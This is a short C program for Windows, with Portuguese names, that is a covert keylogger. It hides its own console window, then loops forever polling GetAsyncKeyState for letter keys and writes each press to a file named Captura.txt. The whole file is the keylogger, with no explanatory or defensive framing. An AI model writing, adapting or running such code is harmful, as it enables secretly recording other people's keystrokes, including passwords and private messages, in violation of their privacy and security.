#include <windows.h>
#include <stdio.h>

int main() {
	int resultado, teclas;
	FILE *arquivo;
	
	SetConsoleTitle("Titulo");

	HWND wnd = FindWindow(0, "Titulo");

		if( wnd != NULL ) {

			ShowWindow(wnd, SW_HIDE);	
		}
	
	arquivo = fopen("Captura.txt", "w");
	
	while(1) {
		for (teclas = 64; teclas <= 90; teclas ++) {
		

		resultado = GetAsyncKeyState(teclas);
		
		 if(resultado == -32767) {
                fprintf(arquivo,"%c",teclas);
        	}
		}
		
	}
	
	return 0;
}
